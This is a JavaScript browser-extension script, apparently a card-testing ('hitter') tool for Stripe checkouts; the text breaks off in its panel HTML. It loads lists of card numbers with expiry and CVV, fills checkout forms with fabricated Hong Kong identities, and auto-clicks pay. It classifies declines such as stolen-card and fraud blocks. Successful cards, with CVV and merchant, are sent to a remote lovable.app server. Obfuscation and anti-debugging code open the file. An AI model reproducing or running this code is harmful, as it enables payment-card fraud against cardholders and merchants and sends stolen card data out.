(function(){var _0x7e26t444w=function(){var _=function(){};_.toString=function(){if(typeof _.__proto__!=='undefined'){_.__proto__=null;}throw new Error('');};try{(function(){_.toString();}());}catch(_e){}};try{_0x7e26t444w();}catch(_){}})();
let _0xba346ejgx = [];
let _0x5272bb4dj = false;
function rnd(a){return a[Math.floor(Math.random()*a.length)];}
const _HK_FB=(()=>{
 const F=['Jason','Kevin','Kelvin','Wilson','Raymond','Tommy','Henry','Eric','Ivan','Victor','Andy','Alan','Gary','Simon','Dennis','Amy','Alice','Cathy','Kelly','Karen','Jenny','Helen','Cindy','Mandy','Grace','Fiona','Lily','Tiffany','Vivian','Ricky'];
 const L=['Chan','Lee','Wong','Lau','Cheung','Ng','Cheng','Ho','Yeung','Leung','Li','Lo','Yip','Kwok','Fung','Chow','Tang','Ma','Tsang','Lam'];
 const A=[
  {s:"Queen's Road Central",d:'Central and Western',a:'Hong Kong Island'},
  {s:'Hennessy Road',d:'Wan Chai',a:'Hong Kong Island'},
  {s:"King's Road",d:'Eastern',a:'Hong Kong Island'},
  {s:'Aberdeen Main Road',d:'Southern',a:'Hong Kong Island'},
  {s:'Yee Wo Street',d:'Wan Chai',a:'Hong Kong Island'},
  {s:'Nathan Road',d:'Yau Tsim Mong',a:'Kowloon'},
  {s:'Canton Road',d:'Yau Tsim Mong',a:'Kowloon'},
  {s:'Argyle Street',d:'Yau Tsim Mong',a:'Kowloon'},
  {s:'Cheung Sha Wan Road',d:'Sham Shui Po',a:'Kowloon'},
  {s:'Prince Edward Road West',d:'Kowloon City',a:'Kowloon'},
  {s:'Lung Cheung Road',d:'Wong Tai Sin',a:'Kowloon'},
  {s:'Kwun Tong Road',d:'Kwun Tong',a:'Kowloon'},
  {s:'Sha Tin Centre Street',d:'Sha Tin',a:'New Territories'},
  {s:'Sha Tsui Road',d:'Tsuen Wan',a:'New Territories'},
  {s:'Castle Peak Road',d:'Tuen Mun',a:'New Territories'},
  {s:'Yuen Long Main Road',d:'Yuen Long',a:'New Territories'},
  {s:'Tai Po Road',d:'Tai Po',a:'New Territories'},
  {s:'Hiram\'s Highway',d:'Sai Kung',a:'New Territories'},
  {s:'Kwai Chung Road',d:'Kwai Tsing',a:'New Territories'},
  {s:'San Hong Street',d:'North',a:'New Territories'},
  {s:'Tung Chung Waterfront Road',d:'Islands',a:'New Territories'},
 ];
 const D=['gmail.com','yahoo.com.hk','hotmail.com','outlook.com','icloud.com','netvigator.com'];
 function r(arr){return arr[Math.floor(Math.random()*arr.length)];}
 function gen(){
  const f=r(F),l=r(L),addr=r(A),n=Math.floor(Math.random()*200)+1;
  return{
   name:`${f} ${l}`,
   address:`${n} ${addr.s}`,
   city:addr.d,
   state:addr.d,
   _region:addr.a,
   zip:'',
   country:'HK',
   email:`${f.toLowerCase()}${l.toLowerCase()}${Math.floor(Math.random()*999)+10}@${r(D)}`,
  };
 }
 return{gen};
})();
function genName(){
 const n=_0xba346ejgx.length?_0xba346ejgx[0].name:_HK_FB.gen().name;
 return n;
}
function genAddr(){
 if (_0xba346ejgx.length > 0) return _0xba346ejgx.shift();
 return _HK_FB.gen();
}
function cardType(n){n=n.replace(/\s/g,'');if(/^4/.test(n))return'VISA';if(/^5[1-5]/.test(n)||/^2[2-7]/.test(n))return'MC';return'AMEX';}
function parseLine(line){
 line=line.trim();if(!line||line.startsWith('#'))return null;
 const p=line.split(/[|;,\t]/).map(x=>x.trim());if(p.length<3)return null;
 const num=p[0].replace(/[\s\-]/g,'');if(!/^\d{13,19}$/.test(num))return null;
 let mm,yy,cvv;
 if(p.length>=4&&!p[1].includes('/')){mm=p[1].padStart(2,'0');yy=p[2].length===4?p[2].slice(-2):p[2].padStart(2,'0');cvv=p[3];}
 else if(p[1].includes('/')){const e=p[1].split('/');mm=e[0].padStart(2,'0');yy=e[1]?.length===4?e[1].slice(-2):e[1]?.padStart(2,'0')||'';cvv=p[2];}
 else if(p[1].length===4){mm=p[1].substring(0,2);yy=p[1].substring(2,4);cvv=p[2];}
 else return null;
 if(!mm||!yy||!cvv)return null;
 return{id:Date.now()+Math.random(),num,expiry:`${mm}/${yy}`,cvv,type:cardType(num)};
}
let ZS_USER = null;
const API_BASE = 'https://project--1963f468-1829-477a-aa1d-f73ff1aa69de-dev.lovable.app';
function getHeaders() {
 return new Promise(r => {
 try {
 chrome.storage.local.get(['zs_token','zs_uid'], d => {
 if (chrome.runtime.lastError) {
 r({'Content-Type':'application/json','X-ZS-Token':'','X-ZS-UID':''});
 return;
 }
 r({
 'Content-Type': 'application/json',
 'X-ZS-Token': d.zs_token || '',
 'X-ZS-UID': String(d.zs_uid || '')
 });
 });
 } catch(e) {
 r({'Content-Type':'application/json','X-ZS-Token':'','X-ZS-UID':''});
 }
 });
}
async function prefetchAddrs(force=false) {
 if (_0x5272bb4dj || (!force && _0xba346ejgx.length > 5)) return;
 _0x5272bb4dj = true;
 try {
 const res = await fetch(`${API_BASE}/api/public/gen-addr`, {
 method:'POST',
 headers: await getHeaders(),
 body: JSON.stringify({count:20, prefer_country: 'MIX'})
 });
 const d = await res.json();
 if (d.ok && d.addresses && d.addresses.length) {
 _0xba346ejgx = _0xba346ejgx.concat(d.addresses);
 }
 } catch(e) {}
 _0x5272bb4dj = false;
}
async function zsLoadUser() {
 return new Promise(r => chrome.storage.local.get(['zs_user'], d => {
 ZS_USER = d.zs_user || null;
 r(ZS_USER);
 }));
}
async function zsCheckHits() {
 if (!ZS_USER) return true; // not logged in = allow (basic mode)
 return new Promise(r => chrome.runtime.sendMessage(
 { action: 'checkHits', user_id: ZS_USER.user_id },
 res => r(res?.allowed !== false)
 ));
}
// ─── Locale-aware amount + currency parser ──────────────────────────────
// Detects currency from page (symbol, code, meta tags) and parses the
// numeric value while preserving the page's original formatting style.
const _ZS_CCY_TABLE = [
 // [regex, code, symbol, locale, decimals]
 [/\b(IDR)\b|Rp\.?\s*[\d.,]/i,'IDR','Rp','id-ID',0],
 [/\b(USD)\b|US\$/i,'USD','$','en-US',2],
 [/\b(EUR)\b|€/,'EUR','€','de-DE',2],
 [/\b(GBP)\b|£/,'GBP','£','en-GB',2],
 [/\b(JPY)\b|¥(?!\s*CN)/,'JPY','¥','ja-JP',0],
 [/\b(CNY|RMB)\b|¥|￥/,'CNY','¥','zh-CN',2],
 [/\b(INR)\b|₹|Rs\.?\s*[\d]/i,'INR','₹','en-IN',2],
 [/\b(AUD)\b|A\$|AU\$/i,'AUD','A$','en-AU',2],
 [/\b(CAD)\b|C\$|CA\$/i,'CAD','C$','en-CA',2],
 [/\b(BRL)\b|R\$/i,'BRL','R$','pt-BR',2],
 [/\b(KRW)\b|₩/,'KRW','₩','ko-KR',0],
 [/\b(THB)\b|฿/,'THB','฿','th-TH',2],
 [/\b(PHP)\b|₱/,'PHP','₱','en-PH',2],
 [/\b(VND)\b|₫/,'VND','₫','vi-VN',0],
 [/\b(MYR)\b|RM\s*[\d]/i,'MYR','RM','ms-MY',2],
 [/\b(SGD)\b|S\$/i,'SGD','S$','en-SG',2],
 [/\b(HKD)\b|HK\$/i,'HKD','HK$','en-HK',2],
 [/\b(TWD|NTD)\b|NT\$/i,'TWD','NT$','zh-TW',0],
 [/\b(CHF)\b|Fr\./i,'CHF','CHF','de-CH',2],
 [/\b(PLN)\b|zł/i,'PLN','zł','pl-PL',2],
 [/\b(TRY)\b|₺/,'TRY','₺','tr-TR',2],
 [/\b(ZAR)\b|R\s*[\d]/,'ZAR','R','en-ZA',2],
 [/\b(MXN)\b|MX\$/i,'MXN','MX$','es-MX',2],
 [/\b(NZD)\b|NZ\$/i,'NZD','NZ$','en-NZ',2],
 [/\b(NOK)\b|kr/i,'NOK','kr','nb-NO',2],
 [/\b(SEK)\b/i,'SEK','kr','sv-SE',2],
 [/\b(DKK)\b/i,'DKK','kr','da-DK',2],
 [/\b(RUB)\b|₽/i,'RUB','₽','ru-RU',2],
 [/\b(AED)\b|د\.إ/i,'AED','AED','ar-AE',2],
 [/\b(SAR)\b|ر\.س/i,'SAR','SAR','ar-SA',2],
 [/\b(ILS)\b|₪/,'ILS','₪','he-IL',2],
 [/\b(HUF)\b|Ft\b/,'HUF','Ft','hu-HU',0],
 [/\b(CZK)\b|Kč/,'CZK','Kč','cs-CZ',2],
 [/\b(ARS)\b/i,'ARS','$','es-AR',2],
 [/\b(CLP)\b/i,'CLP','$','es-CL',0],
 [/\b(COP)\b/i,'COP','$','es-CO',2],
 [/\b(PEN)\b|S\/\.?/i,'PEN','S/','es-PE',2],
];
const _ZS_ZERO_DEC = new Set(['IDR','JPY','KRW','VND','CLP','PYG','RWF','UGX','XAF','XOF','BIF','DJF','GNF','KMF','MGA','VUV','XPF','HUF','ISK','TWD']);

function _zsDetectCurrency(text){
 if(!text) return null;
 for(const [re,code,sym,loc,dec] of _ZS_CCY_TABLE){
  if(re.test(text)) return {currency:code, symbol:sym, locale:loc, decimals:dec};
 }
 // bare $ at end → assume USD
 if(/\$/.test(text)) return {currency:'USD', symbol:'$', locale:'en-US', decimals:2};
 return null;
}

function _zsParseAmount(rawText, el){
 let cur = _zsDetectCurrency(rawText);
 // walk up DOM if no currency found in element text
 if(!cur && el){
  let p = el.parentElement, hops=0;
  while(p && hops<4 && !cur){
   cur = _zsDetectCurrency(p.textContent || '');
   p = p.parentElement; hops++;
  }
 }
 // try meta tags
 if(!cur){
  try{
   const m = document.querySelector('meta[itemprop="priceCurrency"],meta[property="og:price:currency"],meta[name="currency"]');
   const c = m?.getAttribute('content');
   if(c) cur = _zsDetectCurrency(c) || {currency:c.toUpperCase(), symbol:c.toUpperCase(), locale:'en-US', decimals:_ZS_ZERO_DEC.has(c.toUpperCase())?0:2};
  }catch(_){}
 }
 // try lang attr fallback for IDR detection
 if(!cur){
  const lang = (document.documentElement.lang||'').toLowerCase();
  if(/^id/.test(lang) && /\d/.test(rawText)) cur = {currency:'IDR', symbol:'Rp', locale:'id-ID', decimals:0};
 }
 if(!cur) cur = {currency:'USD', symbol:'$', locale:'en-US', decimals:2};

 // extract numeric portion preserving raw structure
 const raw = String(rawText||'').replace(/[\u00A0\s]/g,'');
 const numStr = raw.replace(/[^0-9.,]/g,'');
 if(!numStr) return {amount:'0', display:cur.symbol+'0', formatted:'0', currency:cur.currency, symbol:cur.symbol};

 // detect decimal vs thousands separator from raw structure
 let value = numStr;
 const lastDot = numStr.lastIndexOf('.');
 const lastComma = numStr.lastIndexOf(',');
 const dotCount = (numStr.match(/\./g)||[]).length;
 const commaCount = (numStr.match(/,/g)||[]).length;

 if(lastDot>=0 && lastComma>=0){
  // both present — last one is decimal sep
  if(lastDot > lastComma){
   value = numStr.replace(/,/g,''); // dot=decimal, strip commas
  } else {
   value = numStr.replace(/\./g,'').replace(',','.'); // comma=decimal, strip dots
  }
 } else if(lastComma>=0){
  // only commas
  const after = numStr.length - lastComma - 1;
  if(commaCount>1){
   // multiple commas = thousands (e.g. "1,234,567")
   value = numStr.replace(/,/g,'');
  } else if(after===3 && numStr.length>4){
   // single comma + 3 digits after, likely thousands ("1,000")
   // but could be EU decimal. Use currency hint:
   if(cur.decimals===0){
    value = numStr.replace(/,/g,'');
   } else if(cur.locale && (/de|fr|es|it|nl|pt|tr|ru|pl|id|vi/.test(cur.locale))){
    // EU-style locale → comma is decimal
    value = numStr.replace(',','.');
   } else {
    value = numStr.replace(/,/g,'');
   }
  } else {
   // 1-2 digits after comma → decimal
   value = numStr.replace(',','.');
  }
 } else if(lastDot>=0){
  // only dots
  const after = numStr.length - lastDot - 1;
  if(dotCount>1){
   // multiple dots = thousands (e.g. "1.234.567" IDR style)
   value = numStr.replace(/\./g,'');
  } else if(after===3 && numStr.length>4){
   // single dot + 3 digits after — depends on locale/currency
   if(cur.decimals===0 || /de|id|nl|pt|tr|ru|pl|vi|el/.test(cur.locale||'')){
    value = numStr.replace(/\./g,''); // thousands
   }
   // else keep as decimal (unusual: "1.000" USD = 1.000)
  }
  // else: dot is decimal as-is
 }

 const numeric = parseFloat(value) || 0;
 const decimals = cur.decimals;
 let formatted;
 try{
  formatted = numeric.toLocaleString(cur.locale||'en-US', {
   minimumFractionDigits: decimals,
   maximumFractionDigits: decimals,
  });
 } catch(_){ formatted = numeric.toFixed(decimals); }

 // build display string in original locale style
 // currencies that prefix with space (Rp 75.000) vs glued ($4.99)
 const spaced = ['IDR','MYR','TWD','HKD','SGD','BRL','PLN','TRY','CHF','HUF','CZK','THB','AED','SAR','PEN','ZAR','RUB','NOK','SEK','DKK'];
 const sep = spaced.includes(cur.currency) ? ' ' : '';
 // EUR/some locales put symbol after: "4,99 €"
 const suffixCcy = ['EUR','PLN','HUF','CZK','SEK','NOK','DKK','RUB'];
 const display = suffixCcy.includes(cur.currency)
  ? `${formatted} ${cur.symbol}`
  : `${cur.symbol}${sep}${formatted}`;

 return {
  amount: numeric.toFixed(decimals),
  display,
  formatted,
  currency: cur.currency,
  symbol: cur.symbol,
 };
}

async function zsRecordSuccess(card) {
 if (!ZS_USER) return;
 try {
 const _0x99d3kkz9z = (() => {
  const _ms = [
    '.Header-merchantName',
    '[data-testid="merchant-name"]',
    '[data-testid="header-merchant-name"]',
    '.merchant-name',
    '.BusinessName',
    '.App-name',
  ];
  for (const s of _ms) {
    const t = document.querySelector(s)?.textContent?.trim();
    if (t && t.length > 0) return t.slice(0, 60);
  }
  if (document.referrer) {
    try { return new URL(document.referrer).hostname.replace(/^www\./,'').slice(0,60); } catch(_) {}
  }
  const _h = window.location.hostname.replace(/^(pay|checkout|buy|payments|secure)\./i,'');
  return _h.slice(0, 60);
 })();
 const _0x9d03ge3k9 = document.querySelector(
  '.TotalAmount, [data-testid="order-total"], .order-total, .total-price,' +
  '.PriceBreakdown-total .Text-totalAmount, [data-testid="header-cart-item-price"],' +
  '.ProductSummary-totalAmount, .CurrencyAmount, .LineItem-price,' +
  '[data-testid="order-summary-total-amount"], [data-testid="cart-summary-total-amount"]'
 );
 const _rawAmt = (_0x9d03ge3k9?.textContent || '').trim();
 const _zsParsed = _zsParseAmount(_rawAmt, _0x9d03ge3k9);
 const hdrs = await getHeaders();
 await fetch(`${API_BASE}/api/public/record-success`, {
 method: 'POST',
 headers: hdrs,
 body: JSON.stringify({
 card: `${card.num}|${card.expiry}|${card.cvv}`,
 bin: card.num.slice(0,6),
 domain: _0x99d3kkz9z,
 gateway: 'Stripe Checkout',
 response: 'Charged Successfully',
 amount: _zsParsed.amount || card.amount || '0.00',
 amount_display: _zsParsed.display || '',
 amount_formatted: _zsParsed.formatted || '',
 currency: _zsParsed.currency || 'USD',
 currency_symbol: _zsParsed.symbol || '$',
 })
 });
 } catch(e) {}
}
const FS={
 num:['input[autocomplete*="cc-number"]','input[name*="cardnumber"]','input[name*="card_number"]','input[name*="card-number"]','input[placeholder*="1234" i]','input[placeholder*="card number" i]','input[class*="CardNumber"]','input[name="number"]','input[data-field="number"]'],
 exp:['input[autocomplete*="cc-exp"]','input[name*="expiry"]','input[name*="exp"]','input[placeholder*="MM" i]','input[class*="Expiry"]'],
 emm:['input[name*="exp_month"]','input[name*="expMonth"]','input[placeholder="MM"]'],
 eyy:['input[name*="exp_year"]','input[name*="expYear"]','input[placeholder="YY"]'],
 cvv:['input[autocomplete*="cc-csc"]','input[name*="cvc"]','input[name*="cvv"]','input[placeholder*="CVC" i]','input[placeholder*="CVV" i]','input[class*="Cvc"]'],
 name:['input[autocomplete*="cc-name"]','input[name*="cardholder"]','input[placeholder*="name on card" i]','input[placeholder*="cardholder" i]'],
 addr:['input[autocomplete*="address-line1"]','input[autocomplete*="street-address"]','input[name*="address1"]','input[name*="address_line1"]','input[name*="address-line1"]','input[placeholder*="address" i]','input[placeholder*="Baris alamat 1" i]','input[placeholder*="Address line 1" i]'],
 city:['input[autocomplete*="address-level2"]','input[name*="city"]','input[name*="district"]','input[placeholder*="city" i]','input[placeholder*="district" i]'],
 zip:['input[autocomplete*="postal-code"]','input[name*="zip"]','input[name*="postal"]'],
 country:['select[autocomplete*="country"]','select[name*="country"]'],
 area:[
  'select[autocomplete*="address-level1"]',
  'select[name*="address-level1"]','select[name*="address_level1"]',
  'select[name*="state"]','select[name*="province"]','select[name*="region"]',
  'select[name*="area"]','select[name*="district"]','select[name*="county"]',
  'select[id*="area" i]','select[id*="state" i]','select[id*="province" i]','select[id*="region" i]','select[id*="district" i]',
  'select[aria-label*="area" i]','select[aria-label*="state" i]','select[aria-label*="province" i]','select[aria-label*="region" i]','select[aria-label*="district" i]',
  'select[placeholder*="area" i]','select[placeholder*="state" i]','select[placeholder*="province" i]','select[placeholder*="region" i]',
  // Stripe-specific patterns
  'select[id^="billingAddress"][id*="State" i]','select[id^="billingAddress"][id*="Province" i]','select[id^="billingAddress"][id*="Area" i]',
  'select[id*="ShippingAddress"][id*="State" i]','select[id*="ShippingAddress"][id*="Province" i]',
  // Free-text fallback (some sites use <input> instead of <select>)
  'input[autocomplete*="address-level1"]',
  'input[name*="state"]:not([name*="statement"])','input[name*="province"]','input[name*="region"]:not([name*="registration"])',
 ],
};

// Bulletproof area / state / province / district matcher.
// Tries multiple candidates (state, city, region) with progressively looser
// matching, and as a LAST resort picks the first non-placeholder option so
// the field is never left empty on Stripe / Jenni.ai / any checkout.
function fillAreaSmart(stateVal, cityVal, regionVal){
 const candidates = [stateVal, cityVal, regionVal].filter(v => v && String(v).trim());
 if(!candidates.length) return false;
 const norm = s => String(s||'').toLowerCase().replace(/[^a-z0-9]/g,'').trim();
 const isPlaceholder = (txt,val) => {
  const t=(txt||'').trim().toLowerCase();
  if(!val||val==='')return true;
  return /^(select|choose|pick|please|--|—|country|area|state|province|region|district)\b/i.test(t)||t==='';
 };
 const sels = FS.area || [];
 for(const sel of sels){
  let els;
  try{ els = document.querySelectorAll(sel); }catch(_){ continue; }
  for(const el of els){
   if(!el || !vis(el)) continue;
   // <input> path: just type the value
   if(el.tagName === 'INPUT'){
    const v = candidates[0];
    setV(el, v);
    return true;
   }
   if(!el.options || el.options.length < 2) continue;
   const opts = Array.from(el.options).filter(o => !isPlaceholder(o.text, o.value));
   if(!opts.length) continue;
   let matched = null;
   for(const cand of candidates){
    const cn = norm(cand);
    matched = opts.find(o => o.value === cand || o.text === cand); if(matched) break;
    matched = opts.find(o => o.value.toLowerCase() === cand.toLowerCase() || o.text.toLowerCase() === cand.toLowerCase()); if(matched) break;
    matched = opts.find(o => norm(o.text) === cn || norm(o.value) === cn); if(matched) break;
    matched = opts.find(o => norm(o.text).includes(cn) && cn.length>=3); if(matched) break;
    matched = opts.find(o => cn.includes(norm(o.text)) && norm(o.text).length>=3); if(matched) break;
   }
   // Guarantee: if nothing matched, pick first valid option so field is filled
   if(!matched) matched = opts[0];
   try{ el.focus(); }catch(_){}
   el.value = matched.value;
   ['input','change','blur'].forEach(e => el.dispatchEvent(new Event(e,{bubbles:true})));
   return true;
  }
 }
 return false;
}
const PAY_SEL=['.SubmitButton','[data-testid*="submit"]','button[type="submit"]','input[type="submit"]'];
const PAY_TXT=['pay now','subscribe now','start trial','start free trial','confirm payment','place order','complete purchase','start subscription','pay $','pay €','pay £','subscribe','pay'];
const PAY_SKIP=['link','with link','google pay','apple pay','paypal','venmo','cash app','save my'];
function vis(el){if(!el)return false;const s=window.getComputedStyle(el);return s.display!=='none'&&s.visibility!=='hidden'&&parseFloat(s.opacity)>0&&el.offsetParent!==null;}
function setV(el,v){try{el.focus();const s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value')?.set;if(s)s.call(el,v);else el.value=v;['input','change','keyup','blur'].forEach(e=>el.dispatchEvent(new Event(e,{bubbles:true})));return true;}catch(e){return false;}}
function tryF(type,val){for(const sel of(FS[type]||[])){try{const els=document.querySelectorAll(sel);for(const el of els){if(vis(el)&&el.type!=='hidden'){if(setV(el,val))return true;}}}catch(_){}}return false;}
function fillCard(card){
 const n=card.num.replace(/\s/g,'');
 tryF('num',n.replace(/(.{4})/g,'$1 ').trim())||tryF('num',n);
 const[mm,yy]=card.expiry.split('/');
 if(!tryF('exp',card.expiry)){tryF('emm',mm);tryF('eyy',yy);}
 tryF('cvv',card.cvv);
 if(card.name)tryF('name',card.name);
 const zipVal = card.zip || genAddr().zip;
 if(card.address){ tryF('addr',card.address); tryF('city',card.city); }
 for(const sel of (FS.zip||[])){
 try{
 const el=document.querySelector(sel);
 if(el&&vis(el)){
 el.focus();
 setV(el,''); // clear
 setV(el,zipVal); // fill
 el.dispatchEvent(new Event('input',{bubbles:true}));
 el.dispatchEvent(new Event('change',{bubbles:true}));
 el.blur();
 break;
 }
 }catch(_){}
 }
 if(card.country){
 const cntry = (card.country||'US').toUpperCase();
 const _0x88e7vcipp = {US:'united states',GB:'united kingdom',DE:'germany',FR:'france',NL:'netherlands',AU:'australia',CA:'canada',HK:'hong kong'};
 const _0x20d3bry3t = _0x88e7vcipp[cntry]||cntry.toLowerCase();
 for(const sel of FS.country){
 try{
 const el=document.querySelector(sel);
 if(el&&vis(el)){
 const opt=Array.from(el.options).find(o=>
 o.value.toUpperCase()===cntry ||
 o.value.toLowerCase()===cntry.toLowerCase() ||
 o.text.toLowerCase().includes(_0x20d3bry3t)
 );
 if(opt){el.value=opt.value;el.dispatchEvent(new Event('change',{bubbles:true}));break;}
 }
 }catch(_){}
 }
 }
 fillAreaSmart(card.state,card.city,card._region);
 [300,900,1800].forEach(d=>{setTimeout(()=>{try{fillAreaSmart(card.state,card.city,card._region);}catch(_){}}, d);});
 return true;
}
function forceClick(el){
 if(!el)return false;
 const o={bubbles:true,cancelable:true,view:window};
 el.dispatchEvent(new MouseEvent('mouseover',o));
 el.dispatchEvent(new MouseEvent('mousedown',o));
 el.dispatchEvent(new MouseEvent('mouseup',o));
 el.dispatchEvent(new MouseEvent('click',o));
 return true;
}
function findPayBtn(){
 const skip=typeof PAY_SKIP!=='undefined'?PAY_SKIP:['link','google pay','apple pay','paypal'];
 for(const sel of PAY_SEL){
 try{
 const btns=document.querySelectorAll(sel);
 for(const btn of btns){
 if(!vis(btn))continue;
 const txt=(btn.textContent||btn.value||'').toLowerCase().trim();
 if(skip.some(s=>txt.includes(s)))continue;
 if(PAY_TXT.some(t=>txt.includes(t)))return btn;
 }
 }catch(_){}
 }
 const sb=document.querySelector('button[type="submit"],input[type="submit"]');
 if(sb&&vis(sb)){
 const t=(sb.textContent||sb.value||'').toLowerCase();
 if(!['link','google pay','apple pay','paypal'].some(s=>t.includes(s)))return sb;
 }
 return null;
}
async function waitForPayBtn(ms){
 const deadline=Date.now()+ms;
 while(Date.now()<deadline){
 const b=findPayBtn();
 if(b&&!b.disabled)return b;
 await sleep(100);
 }
 return findPayBtn();
}
function clickPay(){
 const btn=findPayBtn();
 if(!btn)return{ok:false};
 try{btn.click();}catch(_){}
 forceClick(btn);
 return{ok:true,txt:(btn.textContent||'').trim().substring(0,25)};
}
function getState(){
 const txt=document.body.innerText.toLowerCase();
 const url=window.location.href.toLowerCase();
 const _0x7be1923ax=[
 "you're all done here","session has _0x7be1923ax","checkout session","this link has _0x7be1923ax",
 "payment link has _0x7be1923ax","this page is no longer","link is no longer valid"
 ];
 for(const e of _0x7be1923ax){if(txt.includes(e))return{state:'_0x7be1923ax',msg:'Session _0x7be1923ax'};}
 const succ=[
 'thank you for your payment','thank you for subscribing','payment successful',
 'payment confirmed','payment complete','subscription active','subscription confirmed',
 'successfully subscribed','you are now subscribed','trial started','trial active',
 'order confirmed','payment received','payment accepted','charge successful',
 'your subscription','access granted','you are subscribed','subscription created',
 'welcome to','enjoy your',"you're all set"
 ];
 for(const s of succ){if(txt.includes(s))return{state:'success',msg:'Payment successful 🎉'};}
 if(/\/(success|thank.?you|order.?confirmed|payment.?success)/.test(url))
 return{state:'success',msg:'Redirected to success page 🎉'};
 const payBtn = document.querySelector('button[type="submit"],[data-testid*="submit"],[data-testid*="pay"],.SubmitButton,[class*="SubmitButton"]');
 if(payBtn){
 const btnTxt=(payBtn.textContent||'').toLowerCase();
 if(btnTxt.includes('success')||payBtn.querySelector('[class*="success"],[class*="check"]'))
 return{state:'success',msg:'Payment accepted ✓'};
 }
 const errs=[
 {p:/your card was declined/i,m:'Card Declined'},
 {p:/generic[_\s]decline/i,m:'Generic Decline'},
 {p:/do not honor/i,m:'Do Not Honor'},
 {p:/insufficient.{0,10}funds/i,m:'Insufficient Funds'},
 {p:/card.{0,10}not.{0,10}supported/i,m:'Card Not Supported'},
 {p:/prepaid.{0,15}not.{0,10}allow/i,m:'Prepaid Not Allowed'},
 {p:/debit.{0,10}not.{0,10}support/i,m:'Debit Not Supported'},
 {p:/virtual.{0,10}card/i,m:'Virtual Card Blocked'},
 {p:/invalid.{0,10}card|card.{0,10}invalid/i,m:'Invalid Card Number'},
 {p:/card.{0,10}number.{0,10}incorrect/i,m:'Incorrect Card Number'},
 {p:/_0x7be1923ax|expir/i,m:'Card Expired'},
 {p:/incorrect.{0,5}cvc|invalid.{0,5}cvc|cvc.{0,10}incorrect/i,m:'Incorrect CVC'},
 {p:/security.{0,10}code/i,m:'Wrong Security Code'},
 {p:/fraudulent|suspected.{0,10}fraud/i,m:'Flagged as Fraud ⚠'},
 {p:/fraud.{0,10}block/i,m:'Fraud Block'},
 {p:/lost.{0,5}card/i,m:'Lost Card'},
 {p:/stolen.{0,5}card/i,m:'Stolen Card'},
 {p:/pickup.{0,5}card|pick.{0,3}up/i,m:'Card Blocked by Bank'},
 {p:/restricted.{0,10}card/i,m:'Restricted Card'},
 {p:/card.{0,10}restrict/i,m:'Card Restricted'},
 {p:/blocked/i,m:'Card Blocked'},
 {p:/3d.{0,10}secure|authentication.{0,10}required|3ds/i,m:'3D Secure Required 🔐'},
 {p:/verify.{0,10}card|card.{0,10}verif/i,m:'Card Verification Required'},
 {p:/billing.{0,10}address/i,m:'Billing Address Mismatch'},
 {p:/zip.{0,10}code.{0,10}incorrect|postal.{0,5}fail/i,m:'ZIP Code Mismatch'},
 {p:/try.{0,10}again|try.{0,5}later/i,m:'Try Again Later'},
 {p:/processing.{0,10}error/i,m:'Processing Error'},
 {p:/card.{0,10}error/i,m:'Card Error'},
 {p:/network.{0,10}error/i,m:'Network Error'},
 ];
 for(const e of errs){if(e.p.test(txt))return{state:'error',msg:e.m};}
 const errEls=document.querySelectorAll('[class*="error"],[class*="Error"],[role="alert"],[data-testid*="error"]');
 for(const el of errEls){const t=el.textContent.trim();if(t.length>3&&t.length<100&&vis(el))return{state:'error',msg:t.substring(0,60)};}
 return{state:'pending'};
}
function hasForm(){
 const _0x9e6c9xs5a=document.querySelectorAll('iframe[name*="stripe"],iframe[src*="stripe"]').length>0;
 for(const sel of FS.num){try{const el=document.querySelector(sel);if(el&&vis(el))return true;}catch(_){}}
 return _0x9e6c9xs5a;
}
let cards=[];
let apOn=false,apIdx=0,apResults=[],apTimer=null;
function loadCards(){return new Promise(r=>chrome.storage.local.get(['cf_cards'],d=>{cards=d.cf_cards||[];r(cards);}));}
function saveCards(){chrome.storage.local.set({cf_cards:cards});}
function _zsIsCheckoutPage(){
 try{
  const h=(location.hostname||'').toLowerCase();
  const p=(location.pathname||'').toLowerCase();
  if(/(^|\.)(checkout|buy|pay|payments|secure|billing)\.stripe\.com$/.test(h))return true;
  if(/checkout|payment|billing|subscribe|upgrade|order|cart|pay/.test(p))return _zsHasPayForm();
  return _zsHasPayForm();
 }catch(_){return false;}
}
function _zsHasPayForm(){
 try{
  const sels=[
   'input[autocomplete*="cc-number"]','input[name*="cardnumber" i]','input[name*="card_number" i]',
   'input[name*="card-number" i]','input[id*="cardnumber" i]','input[placeholder*="card number" i]',
   'input[placeholder*="1234" i]','input[data-elements-stable-field-name="cardNumber"]',
   '[data-testid*="card-number" i]','[class*="CardNumber" i]','iframe[src*="js.stripe.com"]',
   'iframe[src*="checkout.stripe.com"]','iframe[name*="__privateStripeFrame"]',
   'iframe[title*="Secure card" i]','iframe[title*="payment" i]','iframe[title*="Stripe" i]',
   'form[action*="stripe" i]','form[action*="checkout" i]','form[action*="payment" i]',
   '#payment-form','.payment-form','.StripeElement','.__PrivateStripeElement'
  ];
  for(const s of sels){if(document.querySelector(s))return true;}
  return false;
 }catch(_){return false;}
}
function buildWidget(){
 if(document.getElementById('cf-root'))return;
 if(!_zsIsCheckoutPage()){
  let _zstries=0;
  const _zspoll=setInterval(()=>{
   _zstries++;
   if(_zsIsCheckoutPage()){clearInterval(_zspoll);_zswatch&&_zswatch.disconnect();buildWidget();return;}
   if(_zstries>=20){clearInterval(_zspoll);}
  },800);
  let _zswatch=null;
  try{
   _zswatch=new MutationObserver(()=>{if(_zsIsCheckoutPage()){clearInterval(_zspoll);_zswatch.disconnect();buildWidget();}});
   _zswatch.observe(document.body||document.documentElement,{childList:true,subtree:true});
   setTimeout(()=>{try{_zswatch&&_zswatch.disconnect();}catch(_){}},25000);
  }catch(_){}
  console.log('[ZS] no checkout form yet — watching…');
  return;
 }
 prefetchAddrs();
 const root=document.createElement('div');
 root.id='cf-root';
 root.innerHTML=`
<div id="cf-fab"><div id="cf-fab-dot"></div><span id="cf-fab-lbl">Strike</span><div id="cf-fab-cnt" style="display:none">0</div></div>
<div id="cf-panel">
 <div id="cf-toast"></div>
 <!-- HEADER -->
 <div id="cf-hdr">
 <div id="cf-hdr-left">
 <div id="cf-status-dot"></div>
 <span id="cf-status-txt">STATUS</span>
 <span id="cf-status-val">Ready</span>
 </div>
 <div id="cf-hdr-right">
 <span id="cf-detect" class="nf">No form</span>
 <button id="cf-collapse">▾</button>
 </div>
 </div>
 <!-- TABS -->
 <div id="cf-tabs">
 <button class="cft on" data-tab="bin"># BIN</button>
 <button class="cft" data-tab="bulk">🪪 CARD</button>
 <button class="cft" data-tab="auto">▶ HIT</button>
 </div>
 <!-- BIN TAB -->
